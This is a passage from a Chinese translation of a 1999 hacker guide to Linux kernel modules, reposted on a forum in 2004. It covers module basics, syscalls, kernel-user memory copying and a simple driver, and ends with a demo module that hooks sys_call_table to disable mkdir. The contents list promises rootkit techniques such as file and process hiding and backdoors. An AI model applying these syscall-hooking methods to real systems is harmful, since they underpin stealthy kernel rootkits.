@@ -1,0 +1,2711 @@
+http://safelab.nku.cn:8080/cgi-bin/view.cgi?forum=4&topic=22
+Linux可加载内核模块完全版
+
+(这条文章已经被阅读了 6843 次) 时间：2004/12/01 09:57pm　来源：renjian
+
+
+Linux可加载内核模块完全版
+--黑客、病毒程序编写者和系统管理员的概念性指南
+作者：pragmatic/THC
+版本：1.0
+发布时间：03/1999/
+译者：users.bbs@bbs.nankai.edu.cn
+内容提要
+
+导言
+第一部分 基础知识
+什么是LKM
+什么是系统调用
+什么是内核符号表
+如何进行内核与用户空间内存数据的交换
+使用用户空间的各种函数方法
+常用内核空间函数列表
+什么是内核后台进程
+创建自己的设备
+第二部分 深入探讨
+如何截获系统调用
+哪些系统调用应被截获
+寻找重要的系统调用（strace命令方法）
+迷惑内核系统表
+针对文件系统的黑客方法
+如何隐藏文件
+如何隐藏文件内容（总体说明）
+如何隐藏文件的特定部分（源语示例）
+如何监视重定向文件操作
+如何避免某一文件的属主问题
+如何使黑客工具目录不可访问
+如何改变CHROOT环境
+针对进程的黑客方法
+如何隐藏某一进程
+如何重定向文件的执行
+针对网络（Socket）的黑客方法
+如何控制Socket操作
+终端（TTY）的截取方法
+用LKM编写病毒
+LKM病毒是如何感染文件的（不仅感染模块；源语示例）
+LKM病毒如何协助入侵的
+使LKM不可见、不可删除
+其它滥用内核后台进程的方法
+如何检测自己编写的当前LKM
+第三部分 解决办法（用于系统管理员）
+LKM检测程序的原理与思路
+检测程序示例
+密码保护的creat_module()函数类型程序的实例
+反LKM传染程序的编写思路
+使自己的程序不可跟踪（原理）
+反跟踪程序的源语示例
+用LKM加固Linux内核
+为何给予仲裁程序执行权？（用LKM实现的Phrack的Route的思路）
+链路修补（用LKM实现的Phrack 的Solar Designer的思路）
+/proc 权限修补（用LKM实现的Phrack的Route的思路）
+securelevel修补（用LKM实现的Phrack的Route的思路）
+底层磁盘修补
+第四部分 一些更好的思路（用于黑客）
+反击管理员的LKM的技巧
+修补整个内核—或创建黑客操作系统
+如何在/dev/kmem下寻找内核符号
+无需内核支持的新insmod命令
+最后几句
+第五部分 最新特性：内核2.2
+对LKM编写者来说主要的不同点
+第六部分 最后的话
+LKM的背景或如何使系统插件与入侵兼容
+到其它资源的链接
+致谢
+附录
+A –源代码
+a) LKM Infection by Stealthf0rk/SVAT
+b) Heroin - the classic one by Runar Jensen
+c) LKM Hider / Socket Backdoor by plaguez
+d) LKM TTY hijacking by halflife
+e) AFHRM - the monitor tool by Michal Zalewski
+f) CHROOT module trick by FLoW/HISPAHACK
+g) Kernel Memory Patching by ?
+h) Module insertion without native support by Silvio Cesare
+---------------------------------------------------------------------------------------------------------------------------------------
+导 言
+用Linux构造服务器环境越来越流行，所以入侵Linux也日益增多。攻击Linux的最高技术之一就是使用内核代码。这种内核代码可据其特性称为可加载内核模块（LKM），是一段运行在内核空间的代码，这就允许我们访问操作系统最敏感的部分。以前也有一些非常出色的介绍LKM 入侵的文献（例如Phrack），他们介绍新的思路、新的方法并完成一个黑客梦寐以求的功能的LKM，并且1998年一些公开的讨论（新闻组、邮件列表）也是非常热门的。
+为什么我又写一遍关于LKM的文字呢，有几个原因：以前的文献对内核初学者没有给出好的解释；本文有比较大的篇幅帮助初学者去理解概念。我见过很多利用漏洞或窃听程序却对这些东西如何工作一无所知的人。我在文中包括了大量加了详细注释的源代码，主要也是为了帮助那些知道网络入侵远远不同于网络破坏的初学者。
+所有公开的文献都是关于某个主题的，没有专门为黑客写的关于LKM的完备的指导。本文将涵盖内核滥用的几乎所有方面（甚至关于病毒）本文是从黑客和病毒程序编写者的角度出发的，但对系统管理员和一般内核开发人员改进工作也有帮助。
+早期的文献向我们提供了LKM滥用的主要优点和方法，但没有什么是大家没听说过的。本文将提供一些新的思路。（没有完全都是新的东西，但有些东西会对我们有所帮助）本文将提供一些概念，用简单的方法防止LKM攻击。
+本文还将说明如何运用一些方法打破LKM保护，如实时代码修补。
+请记住，新思路的实现是用源语模块实现的（只用于演示），如果要实际使用就须改写。
+本文的写作动机是给大家一篇涵盖LKM所有问题的文章。在附录A给出了一些已有的LKM插
+件和它们工作的简单描述以及如何使用它们。
+整个文章（第五部分除外）是基于Linux2.0.x机器的（x86）。本人测试了所有程序和代码段。为了使用本文的大部分程序例子，Linux系统必须支持LKM。只有第四部分提供的源代码无须本地LKM支持。本文中的大部分思路在2.2.x版本的系统上也能用（也许需要一些轻微改动）；但想到2.2.x 内核刚刚发布（1/99）并且大部分发行商一直使用2.0.x（Redhat,SuSE,Caldera,...）。要到四月一些发行商如SuSE才会发行它们的2.2.x版内核，所以目前还无须知道如何入侵2.2.x内核。好的系统管理员为了更稳定的2.2.x内核也等了好几个月了。[注：好多系统不需要2.2.x内核所以还会沿用2.0.x]
+本文有专门一节帮助系统管理员针对LKM提高系统安全。读者（黑客）也要阅读此节，你必须懂得系统管理员懂的所有知识，甚至比他懂的更多。你从此节也会获得一些思路，帮助自己编写更高级的‘黑客—LKM’。请通读全文。
+请记住：本文仅用于教育目的。如利用本文的知识从事非法活动，后果自负。
+
+第一部分 基础知识
+什么是LKM?
+LKM是Linux内核为了扩展其功能所使用的可加载内核模块。LKM的优点：动态加载，无须重新实现整个内核。基于此特性，LKM常被用作特殊设备的驱动程序（或文件系统），如声卡的驱动程序等等。所有的LKM包含两个最基本的函数（最小）：
+
+int init_module(void) /*用于初始化所有成员*/
+{
+...
+}
+void cleanup_module(void) /*用于退出清理*/
+{
+...
+}
+
+加载一个模块使用如下命令，一般只有root有此权限：
+#insomod module.o
+此命令强制系统如下工作：
+加载目标文件（此处为module.o）
+调用create_module系统调用（关于系统调用见I.2）重新分配内存
+内核符号用系统调用get_kernel_syms解析尚未解析的引用
+然后系统调用init_module初始化LKMà 即执行int init_module(void)函数
+内核符号将在I.3中解释（内核符号表）。
+
+下面我们写出第一个小LKM展示一下它的基本工作原理：
+#define MODULE
+#include
+int init_module(void)
+{
+printk("<1>Hello World\n");
+return 0;
+}
+void cleanup_module(void)
+{
+printk("<1>Bye, Bye");
+}
+你可能想知道为什么用printk(...)而不是用printf(...)，是的，内核编程大体上是不同于用户空间编程的。你只有一个有限的命令集(见 I.6)。用这些命令你不能做太多事，所以你将学到如何利用你所知的用户空间应用的大量函数去帮助你攻击内核。耐心一点，我们不得不做一些以前(没听过，没做过...)的一些事。
+上例如下编译：
+#gcc –c –O3 helloworld.c
+#insmod helloworld.o
+好，我们的模块被加载了，并显示了最著名的文字。现在你可以用一些命令来告诉你你的LKM确实存在于内核空间了。
+#lsmod
+Module Pages Used by
+helloworld 1 0
+此命令从/proc/modules下读取信息，显示当前哪些模块被加载。’Pages’是内存信息（此模块用了多少页）；’Used by’栏目告之此模块被系统用了多少次（引用次数）。只有此栏目数值为0时，才能删除模块；检查此数值后，可用如下命令删除模块：
+#rmmod helloworld
+好，这是我们朝着滥用LKM走的第一小步（非常小）。本人经常把LKM同以前DOS下内存驻留程序进行对比（我知道，它们有很多不同），它们都是我们驻留在内存中截获每个我们想要的中断的一个门户。微软的Win9x有种程序叫VxD的，也同LKM相似（当然也有很多不同）。这些驻留程序最令人感兴趣的部分是具有挂起系统函数的功能，这些系统函数在Linux世界里被称为系统调用。
+
+什么是系统调用?
+我希望你能明白，每个操作系统都有一些嵌在内核中的函数，这些函数可以被系统的每个操作使用。这些Linux使用的函数称为系统调用。它们对应用户和内核之间的转换。在用户空间打开一个文件对应内核空间的sys_open系统调用。要得到自己系统的完全的系统调用列表可以看/usr/include/sys/syscall.h文件。下面是我机器上的syscall.h列表：
+
+#ifndef _SYS_SYSCALL_H
+#define _SYS_SYSCALL_H
+#define SYS_setup 0 /* 只用于初始化，使系统运行 。*/
+#define SYS_exit 1
+#define SYS_fork 2
+#define SYS_read 3
+#define SYS_write 4
+#define SYS_open 5
+#define SYS_close 6
+#define SYS_waitpid 7
+#define SYS_creat 8
+#define SYS_link 9
+#define SYS_unlink 10
+#define SYS_execve 11
+#define SYS_chdir 12
+#define SYS_time 13
+#define SYS_prev_mknod 14
+#define SYS_chmod 15
+#define SYS_chown 16
+#define SYS_break 17
+#define SYS_oldstat 18
+#define SYS_lseek 19
+#define SYS_getpid 20
+#define SYS_mount 21
+#define SYS_umount 22
+#define SYS_setuid 23
+#define SYS_getuid 24
+#define SYS_stime 25
+#define SYS_ptrace 26
+#define SYS_alarm 27
+#define SYS_oldfstat 28
+#define SYS_pause 29
+#define SYS_utime 30
+#define SYS_stty 31
+#define SYS_gtty 32
+#define SYS_access 33
+#define SYS_nice 34
+#define SYS_ftime 35
+#define SYS_sync 36
+#define SYS_kill 37
+#define SYS_rename 38
+#define SYS_mkdir 39
+#define SYS_rmdir 40
+#define SYS_dup 41
+#define SYS_pipe 42
+#define SYS_times 43
+#define SYS_prof 44
+#define SYS_brk 45
+#define SYS_setgid 46
+#define SYS_getgid 47
+#define SYS_signal 48
+#define SYS_geteuid 49
+#define SYS_getegid 50
+#define SYS_acct 51
+#define SYS_phys 52
+#define SYS_lock 53
+#define SYS_ioctl 54
+#define SYS_fcntl 55
+#define SYS_mpx 56
+#define SYS_setpgid 57
+#define SYS_ulimit 58
+#define SYS_oldolduname 59
+#define SYS_umask 60
+#define SYS_chroot 61
+#define SYS_prev_ustat 62
+#define SYS_dup2 63
+#define SYS_getppid 64
+#define SYS_getpgrp 65
+#define SYS_setsid 66
+#define SYS_sigaction 67
+#define SYS_siggetmask 68
+#define SYS_sigsetmask 69
+#define SYS_setreuid 70
+#define SYS_setregid 71
+#define SYS_sigsuspend 72
+#define SYS_sigpending 73
+#define SYS_sethostname 74
+#define SYS_setrlimit 75
+#define SYS_getrlimit 76
+#define SYS_getrusage 77
+#define SYS_gettimeofday 78
+#define SYS_settimeofday 79
+#define SYS_getgroups 80
+#define SYS_setgroups 81
+#define SYS_select 82
+#define SYS_symlink 83
+#define SYS_oldlstat 84
+#define SYS_readlink 85
+#define SYS_uselib 86
+#define SYS_swapon 87
+#define SYS_reboot 88
+#define SYS_readdir 89
+#define SYS_mmap 90
+#define SYS_munmap 91
+#define SYS_truncate 92
+#define SYS_ftruncate 93
+#define SYS_fchmod 94
+#define SYS_fchown 95
+#define SYS_getpriority 96
+#define SYS_setpriority 97
+#define SYS_profil 98
+#define SYS_statfs 99
+#define SYS_fstatfs 100
+#define SYS_ioperm 101
+#define SYS_socketcall 102
+#define SYS_klog 103
+#define SYS_setitimer 104
+#define SYS_getitimer 105
+#define SYS_prev_stat 106
+#define SYS_prev_lstat 107
+#define SYS_prev_fstat 108
+#define SYS_olduname 109
+#define SYS_iopl 110
+#define SYS_vhangup 111
+#define SYS_idle 112
+#define SYS_vm86old 113
+#define SYS_wait4 114
+#define SYS_swapoff 115
+#define SYS_sysinfo 116
+#define SYS_ipc 117
+#define SYS_fsync 118
+#define SYS_sigreturn 119
+#define SYS_clone 120
+#define SYS_setdomainname 121
+#define SYS_uname 122
+#define SYS_modify_ldt 123
+#define SYS_adjtimex 124
+#define SYS_mprotect 125
+#define SYS_sigprocmask 126
+#define SYS_create_module 127
+#define SYS_init_module 128
+#define SYS_delete_module 129
+#define SYS_get_kernel_syms 130
+#define SYS_quotactl 131
+#define SYS_getpgid 132
+#define SYS_fchdir 133
+#define SYS_bdflush 134
+#define SYS_sysfs 135
+#define SYS_personality 136
+#define SYS_afs_syscall 137 /* 用于Andrew文件系统的系统调用。*/
+#define SYS_setfsuid 138
+#define SYS_setfsgid 139
+#define SYS__llseek 140
+#define SYS_getdents 141
+#define SYS__newselect 142
+#define SYS_flock 143
+#define SYS_syscall_flock SYS_flock
+#define SYS_msync 144
+#define SYS_readv 145
+#define SYS_syscall_readv SYS_readv
+#define SYS_writev 146
+#define SYS_syscall_writev SYS_writev
+#define SYS_getsid 147
+#define SYS_fdatasync 148
+#define SYS__sysctl 149
+#define SYS_mlock 150
+#define SYS_munlock 151
+#define SYS_mlockall 152
+#define SYS_munlockall 153
+#define SYS_sched_setparam 154
+#define SYS_sched_getparam 155
+#define SYS_sched_setscheduler 156
+#define SYS_sched_getscheduler 157
+#define SYS_sched_yield 158
+#define SYS_sched_get_priority_max 159
+#define SYS_sched_get_priority_min 160
+#define SYS_sched_rr_get_interval 161
+#define SYS_nanosleep 162
+#define SYS_mremap 163
+#define SYS_setresuid 164
+#define SYS_getresuid 165
+#define SYS_vm86 166
+#define SYS_query_module 167
+#define SYS_poll 168
+#define SYS_syscall_poll SYS_poll
+#endif /* */
+
+每个系统调用被定义了一个数字（见上列表），实际上是用数字做系统调用。内核用中断0x80管理所有的系统调用。系统调用号和其它参数被移入某个寄存器（例如，将系统调用号放入eax）。Sys_call_table[]作为内核中的一个结构数组，系统调用号此数组的索引，这个结构数组把系统调用号映像到所需服务函数。好，这些知识足够继续读下去了，下表列出了最让人感兴趣的系统调用，附有简短说明。相信我，如果你想编写真正有用的LKM，你必须确切弄懂这些系统调用如何工作的。
+
+系统调用
+描述
+int sys_brk(unsigned long new_brk);
+改变数据段的大小，此系统调用将在I.4中讨论
+
+int sys_fork(struct pt_regs regs);
+对应用户空间著名函数fork()的系统调用
+
+int sys_getuid ()
+int sys_setuid (uid_t uid)
+...
+管理UID 等的系统调用
+
+int sys_get_kernel_sysms(struct kernel_sym *table)
+访问内核系统表的系统调用 (见I.3)
+
+int sys_sethostname (char *name, int len);
+int sys_gethostname (char *name, int len);
+sys_sethostname 用于设置主机名，sys_gethostname 用于取回主机名
+
+int sys_chdir (const char *path);
+int sys_fchdir (unsigned int fd);
+两个函数都用于设置当前路径（cd ...）
+
+int sys_chmod (const char *filename, mode_t mode);
+int sys_chown (const char *filename, mode_t mode);
+int sys_fchmod (unsigned int fildes, mode_t mode);
+int sys_fchown (unsigned int fildes, mode_t mode);
+用来管理权限等的一些函数
+
+int sys_chroot (const char *filename);
+为申请调用的进程设置根路径
+
+int sys_execve (struct pt_regs regs);
+重要的系统调用，用来执行文件（pt_regs是寄存器堆栈）
+
+long sys_fcntl (unsigned int fd, unsigned int cmd, unsigned long arg);
+改变fd（打开文件的描述符）的特征
+
+int sys_link (const char *oldname, const char *newname);
+int sym_link (const char *oldname, const char *newname);
+int sys_unlink (const char *name);
+管理硬/软链接的系统调用
+
+int sys_rename (const char *oldname, const char *newname);
+改文件名
+
+int sys_rmdir (const char* name);
+int sys_mkdir (const *char filename, int mode);
+创建和删除目录
+
+int sys_open (const char *filename, int mode);
+int sys_close (unsigned int fd);
+打开相关文件（也可创建），关闭文件
+
+int sys_read (unsigned int fd, char *buf, unsigned int count);
+int sys_write (unsigned int fd, char *buf, unsigned int count);
+读写文件的系统调用
+
+int sys_getdents (unsigned int fd, struct dirent *dirent, unsigned int count);
+取文件列表的系统调用（ls等命令）
+
+int sys_readlink (const char *path, char *buf, int bufsize);
+读符号链接
+
+int sys_selectt (int n, fd_set *inp, fd_set *outp, fd_set *exp, struct timeval *tvp);
+复杂I/O操作
+
+sys_socketcall (int call, unsigned long args);
+socket 函数
+
+unsigned long sys_create_module (char *name, unsigned long size);
+int sys_delete_module (char *name);
+int sys_query_module (const char *name, int which, void *buf, size_t bufsize, size_t *ret);
+用于加载/卸载及查询LKM
+
+我认为对任何入侵这些都是最重要的系统调用，当然对你作为超级用户的系统可能还需要一些更特殊的。但一般的黑客更可能使用上面列出的。在第二部分你会学到怎样使用对你有用的系统调用。
+
+什么是内核符号表                 nxg
+好，我们理解了模块和系统调用最基本的概念。但还有另外一个我们需要理解的重点—内核符号表。看一下/proc/ksyms，这个文件的每一项代表一个引出的（公共）内核符号，可被我们的LKM访问。再仔细看看这个文件，你会发现很多有趣的东西。这个文件真的很有趣，可以帮助我们看一看我们的LKM能用哪些内核符号；但有个问题，在我们的LKM（象函数一样）中使用的每个符号也被引出为公共符号，也列在此文件中，所以有经验的系统管理员能发现我们的小LKM并杀掉它。
+有很多种方法可防止管理员看到我们的LKM，看节II。在第二节中提到的方法可以被称为欺骗（’Hack’），但你读第二节的内容时，你看不到“把LKM符号排除在/proc/ksyms之外”的字样。；在第二节中没提到这个问题的原因如下：你并不需要把你的模块符号排除在/proc /ksyms之外的技巧。LKM的开发人员可用如下的常规代码限制他们模块的输出符号：
+static struct symbol_table module_syms= { /*定义自己的符号表*/
+#include /*我们想要输出的符号，我们真想么？*/
+...
+};
+register_symtab(&module_syms); /*做实际的注册工作*/
+正如我所说，我们不想输出任何符号为公共符号，所以我们用如下构造函数：
+register_symtab(NULL);
+这一行必须插入到init_module()函数中，记住这一点！
+
+如何进行内核与用户空间内存数据的交换?
+到目前为止本文非常基本非常容易。现在我们来点难的（但提高不多）。在内核空间编程有很多好处，但也有很多不足。系统调用从用户空间获得参数（系统调用在一些封装程序如libc中实现），但我们的LKM运行在内核空间。在节II中你会看到检查某个系统调用的参数非常重要，因为要根据参数决定对策。但我们怎么才能在工作于内核空间的模块中访问用户空间中的参数呢？
+解决办法：我们必须进行传送。 对非利用内核入侵的黑客来说有点奇怪，但也非常容易。看下面的系统调用：
+int sys_chdir (const char *path)
+想象一下系统调用它，我们截获了调用（将在节II中讲到）。我们想检查一下用户想设置的路径，所以我们必须访问char *path。如果你试着象下面那样直接访问path变量
+printk("<1>%s\n", path);
+就一定会出问题。记住你是在内核空间，你不能轻易的读用户空间内存。在Phrack52你可得到plaguez的解决方法，专用于传送字符串。他用内核模式函数（宏）取回用户空间内存中的字节。
+#include
+get_user(pointer);
+给这个函数一个指针指向*path就可帮助我们从用户空间取到想要的东西到内核空间。看一下plaguez写的在用户空间到内核空间移动字符串的的程序：
+char *strncpy_fromfs(char *dest, const char *src, int n)
+{
+char *tmp = src;
+int compt = 0;
+do {
+dest[compt++] = __get_user(tmp++, 1);
+}
+while ((dest[compt - 1] != '\0') && (compt != n));
+return dest;
+}
+如果我们想转换*path变量，我们可用如下内核代码：
+char *kernel_space_path;
+kernel_space_path = (char *) kmalloc(100, GFP_KERNEL); /* 在内核空间中分配内存*/
+(void) strncpy_fromfs(test, path, 20); /*调用plaguez写的函数*/
+printk("<1>%s\n", kernel_space_path); /*现在我们可以使用任何想要的数据了*/
+kfree(test); /*想着释放内存*/
+上面的代码工作的非常好。一般性的传送太复杂；plaguez只用它来传送字符串（函数只用于字符串拷贝）。一般数据的传送可用如下函数简单实现：
+#include
+void memcpy_fromfs(void *to, const void *from, unsigned long count);
+两个函数显而易见基于同类命令，但第二个函数同plaguez新定义的函数几乎一样。我推荐用memcpy_fromfs(...)做一般数据传送，plaguez的前一个用于字符串拷贝。
+现在我们知道了如何把用户空间的内存转换到内核空间。但反向怎么办？这有点难，因为我们不容易在内核空间的位置定位用户空间。也许我们可以用如下方式处理转换：
+#include
+void memcpy_tofs(void *to, const void *from, unsigned long count);
+但如何在用户空间中定位*to指针呢？plaguez在Phrack一文中给出了最好的解决方法：
+/*我们需要brk系统调用*/
+static inline _syscall1(int, brk, void *, end_data_segment);
+...
+int ret, tmp;
+char *truc = OLDEXEC;
+char *nouveau = NEWEXEC;
+unsigned long mmm;
+mmm = current->mm->brk; /*定位当前进程数据段大小*/
+ret = brk((void ) (mmm + 256)); /*利用系统调用brk为当前进程增加内存256个字节
+*/
+if (ret < 0)
+return ret; /*分配不成功*/
+memcpy_tofs((void *) (mmm + 2), nouveau, strlen(nouveau) + 1);
+这里使用了一个非常高明的技巧。Current是指向当前进程任务结构的指针；mm是指向对应进程内存管理的数据结构mm_struct的指针。通过用 brk系统调用作用于current->mm->brk，我们可以增加未用数据段空间大小，同时我们知道分配内存就是处理数据段，所以通过增加未用空间大小，我们就为当前进程分配了一些内存。这块内存可用于将内核空间内存拷贝到用户空间（当前进程）。
+你可能想知道上面代码中第一行是做什么用的。这一行帮助我们使用在内核空间象调用函数一样使用用户空间。所有的用户空间函数对应一个a_syscall(...)形式的宏，所以我们可以构造一个系统调用宏对应用户空间的某个函数（通过系统调用对应）；这里是针对brk(..)的。
+
+使用用户空间的各种函数方法
+你看到的在I.4中我们用一系统调用宏来构造我们自己的brk调用，它很象我们所知的用户空间的brk。事实是用户空间的库函数（并非所有的）是通过这样的系统调用宏来实现的。下面的代码展示了用来构造我们在I.4中用的brk(...)函数的_syscall(...)宏（取自/asm /unistd.h）。
+#define _syscall1(type,name,type1,arg1) \
+type name(type1 arg1) \
+{ \
+long __res; \
+__asm__ volatile ("int $0x80" \
+: "=a" (__res) \
+: "0" (__NR_##name),"b" ((long)(arg1))); \
+if (__res >= 0) \
+return (type) __res; \
+errno = -__res; \
+return -1; \
+return -1; \
+}
+你无须了解这段代码的全部功能，它只是用_syscall的参数作为参数调用中断0x80（见I.2）。name是我们所需的系统调用（name被扩展为 __NR_name，在/asm/unistd.h中定义）。用这种办法我们实现了brk函数。其它带有不同个数参数的函数由其它宏实现 (_syscallX，其中X代表参数个数)。
+
+我个人用其它方法实现函数；见下例：
+int (*open)(char *, int, int); /*声明原型*/
+open = sys_call_table[SYS_open]; /*你也可以用__NR_open*/
+用这种方法你无须用任何系统调用宏，你只用来自sys_call_table的函数指针就可以了。我曾在网上发现SVAT的著名LKM感染程序就是用的这种象函数一样构造用户空间的方法。我认为这是较好的解决办法，但你要自己判断和测试。
+要注意为这些系统调用提供参数的时候，是来自用户空间而非你的内核空间。读I.4找把内核空间的数据传递到用户空间内存中的方法。一个非常简单的做这些的方法是处理寄存器。你必须知道Linux用段选择器去区分内核空间、用户空间等等。从用户空间传给系统调用的参数位于数据段选择器限定的某个位置。[我在 I.4中没提到这些，因为它更适合本节。]
+从asm/segment.h知DS可用get_ds()取回。所以系统调用中使用的参数数据可在内核空间中访问，只要我们把内核空间所用的段选择器的DS值设为用户段的值就可以了。这可用set_fs(...)实现。但要小心，你必须访问完系统调用的参数之后恢复FS。下面我们看一段有用的代码：
+例如filename在内核空间的我们刚建立的一个字符串，
+unsigned long old_fs_value=get_fs();
+set_fs(get_ds); /*此后我们可以访问用户空间中数据*/
+open(filename, O_CREAT|O_RDWR|O_EXCL, 0640);
+set_fs(old_fs_value); /*恢复fs...*/
+我认为这是最简单/最快的解决问题的方法，但还需你自己测试。记住我在这里举的函数例子（brk，open）都是通过一个系统调用实现的。但也有很多用户空间函数是集成在一个系统调用里面的。看一下重要系统调用列表（I.2）；例如，sys_socket调用实现了所有关于socket的功能（创建、关闭、发送、接收...）。所以构造自己的函数是要小心，最好看一下内核源码。
+
+常用内核空间函数列表
+本文的开始我介绍了printk(...)函数，它是所有人都可在内核空间使用的，所以叫内核函数。内核开发人员需要很多通常只有通过库函数才能完成的复杂函数，这些函数被编制成内核函数。下面列出经常使用的最重要的内核函数：
+函数/宏
+描述
+int sprintf (char *buf, const char *fmt, ...);
+int vsprintf (char *buf, const char *fmt, va_list args);
+接收数据到字符串中的函数
+
+printk (...)
+同用户空间的printf函数
+
+void *memset (void *s, char c, size_t count);
+void *memcpy (void *dest, const void *src, size_t count);
+char *bcopy (const char *src, char *dest, int count);
+void *memmove (void *dest, const void *src, size_t count);
+int memcmp (const void *cs, const void *ct, size_t count);
+void *memscan (void *addr, unsigned char c, size_t size);
+内存函数
+
+int register_symtab (struct symbol_table *intab);
+见 I.1
+
+char *strcpy (char *dest, const char *src);
+char *strncpy (char *dest, const char *src, size_t count);
+char *strcat (char *dest, const char *src);
+char *strncat (char *dest, const char *src, size_t count);
+int strcmp (const char *cs, const char *ct);
+int strncmp (const char *cs,const char *ct, size_t count);
+char *strchr (const char *s, char c);
+size_t strlen (const char *s);size_t strnlen (const char *s, size_t count);
+size_t strspn (const char *s, const char *accept);
+char *strpbrk (const char *cs, const char *ct);
+char *strtok (char *s, const char *ct);
+字符串比较函数等等
+
+unsigned long simple_strtoul (const char *cp, char **endp, unsigned int base);
+把字符串转换成数字
+
+get_user_byte (addr);
+put_user_byte (x, addr);
+get_user_word (addr);
+put_user_word (x, addr);
+get_user_long (addr);
+put_user_long (x, addr);
+访问用户内存的函数
+
+suser();
+fsuser();
+检测超级用户权限
+
+int register_chrdev (unsigned int major, const char *name, struct file_o perations *fops);
+int unregister_chrdev (unsigned int major, const char *name);
+int register_blkdev (unsigned int major, const char *name, struct file_o perations *fops);
+int unregister_blkdev (unsigned int major, const char *name);
+登记设备驱动器的函数
+..._chrdev -> 字符设备
+..._blkdev -> 块设备
+
+请记住，这些函数中有的也可用I.5中提到的方法实现。当然你也要明白，如果内核已经提供了这些，自己构造就意义不大了。后面你将看到这些函数（尤其是字符串比较）对实现我们的目的非常重要。
+
+什么是内核后台进程
+最后我们基本到了基础知识部分的结尾，现在我解释一下内核后台进程的运行情形（/sbin/kerneld）。从名字可以看到这是一个用户空间中等待某个动作的进程。首先应该知道，为了应用kerneld的特点，必须在建立内核时激活kerneld选项。Kerneld按如下方式工作：如果内核想访问某项资源（当然在内核空间），而资源目前没有，它并不产生错误，而是向Kerneld请求该项资源。如果kerneld能够提供资源，就加载所需的LKM，内核继续运行。使用这种模式可以仅当LKM真正需要/不需要时被加载或卸载。很明显这些工作在用户空间和内核空间都有。
+Kerneld存在于用户空间。如果内核请求一个新模块，这个后台进程将收到一个内核发来的通知哪个模块被加载的字符串。内核可能发送一个一般的名字象eth0（而非对象文件），这时系统需要查找/etc/modules.conf中的别名行。这些行把系统所需的LKM同一般名称匹配起来。
+
+下行说明eth0对应DEC的Tulip 驱动程序LKM
+# /etc/modules.conf # 或/etc/conf.modules – 反过来
+alias eth0 tulip
+以上是对应用户空间由kerneld后台进程使用的。内核空间主要由4个函数对应。这些函数都基于对kernekl_send的调用。确切的通过kerneld_send调用这些函数的方法可参见linux/kerneld.h。下表列出上面提到的四个函数：
+
+函数
+描述
+
+int sprintf (char *buf, const char *fmt, ...);
+int vsprintf (char *buf, const char *fmt, va_list args);
+用于把输入数据放入字符串中的函数
+
+int request_module (const char *name);
+告知kerneld内核请求某个模块（给出名称或类ID/名称）
+
+int release_module (const char* name, int waitflag);
+卸载模块
+
+int delayed_release_module (const char *name);
+延迟卸载
+
+int cancel_release_module (const char *name);
+取消对delayed_release_module 的调用
+注：内核2.2版用其它模式请求模块。参见第五部分。
+
+建立你自己的设备
+附录A介绍了TTY截取功能，它用一设备记录结果。所以我们先看一个设备驱动程序的很基本的例子。看如下代码（这是一个最基本的驱动程序，我主要写来演示，它几乎什么也不做）：
+#define MODULE
+#define __KERNEL__
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+/*只用于演示*/
+static int driver_open(struct inode *i, struct file *f)
+{
+printk("<1>Open Function\n");
+return 0;
+}
+/*登记我们的驱动程序提供的所有函数*/
+static struct file_operations fops = {
+NULL, /*lseek*/
+NULL, /*read*/
+NULL, /*write*/
+NULL, /*readdir*/
+NULL, /*select*/
+NULL, /*ioctl*/
+NULL, /*mmap*/
+driver_open, /*open, 看一下我们提供的open函数*/
+NULL, /*release*/
+NULL /*fsync...*/
+};
+
+int init_module(void)
+{
+/*登记驱动程序，符号为40，名称为driver */
+if(register_chrdev(40, "driver", &fops)) return -EIO;
+return 0;
+}
+void cleanup_module(void)
+{
+/*注销driver*/
+unregister_chrdev(40, "driver");
+}
+最重要的函数是register_chrdev(...)，它把我们的驱动程序以主设备号40登记，如果你想访问此驱动程序，如下操作：
+# mknode /dev/driver c 40 0
+# insmod driver.o
+然后你就可以访问设备了（但我因为没时间没实现任何功能）。File_operations结构指明我们的驱动程序将提供给系统的所有函数（操作）。正如你所见我仅仅实现了最基本的无用函数输出一点东西。显然你可以用如上方法简单的实现你自己的设备。做一点练习。如果你想记录数据（如击键），你可以在驱动程序中建立一个缓冲区，然后通过设备接口将其内容输出。
+
+第二部分 深入探讨
+如何截获系统调用
+现在我们开始滥用LKM模式。一般LKM用于扩展内核（尤其硬件驱动程序）。我们的攻击 ‘hack’要做点儿不同的，首先截获系统调用然后修改它们，以便针对某个命令改变系统的响应方式。下面的模块使修改过的系统上的用户不能创建目录。这只是我们将如何工作的一个小小演示：
+#define MODULE
+#define __KERNEL__
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+extern void* sys_call_table[]; /*sys_call_table 被引出，所以我们可访问它*/
+int (*orig_mkdir)(const char *path); /*未改前的系统调用*/
+int hacked_mkdir(const char *path)
+{
+return 0; /*一切正常，但新的系统调用什么也不做*/
+}
+int init_module(void) /*模块初始化*/
+{
+orig_mkdir=sys_call_table[SYS_mkdir];
+sys_call_table[SYS_mkdir]=hacked_mkdir;
+return 0;
+}
+void cleanup_module(void) /*模块卸载*/
+{
+sys_call_table[SYS_mkdir]=orig_mkdir; /*把mkdir系统调用恢复*/
+}
+
+编译执行这个模块（见I.1），试着建目录，应该不行。因为返值为0（意味着正常）我们不能获得错误信息。删掉模块后，又可以建目录了。如你所见，要截获内核系统调用，只需更改sys_call_table（见I.2）中的对应登记项。
+截获系统调用的一般方法大致如下列出：
+在 sys_call_table[]中查找系统调用的登记项（看一下include/sys/syscall.h）用函数指针把 sys_call_table[X]中的原始登记项保存（X代表想截获的系统调用号）通过设置sys_call_table[X]为所需函数地址，把你自己定义的新的系统调用（伪装过的）地址保存起来。
+你要意识到把原始系统调用的函数指针保存非常有用，因为在你的伪造的函数中要用它来仿真原始函数。在写‘Hack-LKM’时你要面对的第一个问题就是‘哪个系统调用应被截获’。
+
+哪些系统调用应被截获
+也许你并非‘内核高手’，不知道所有应用程序或命令可使用的用于用户空间函数的系统调用。所以我将给你一些找到要控制的系统调用的提示：
+a).读源代码。对于象Linux这样的系统，你几乎可以得到用户（管理员）所用的所有程序的源代码。一旦你找到一些基本函数如dup,open,write...看b)。
+b).看一下include/sys/syscall.h（见I.2）试着找出直接对应的系统调用（对于dup可找到SYS_dup；对于write可找到SYS_write；...）。如果这样不行看c)。
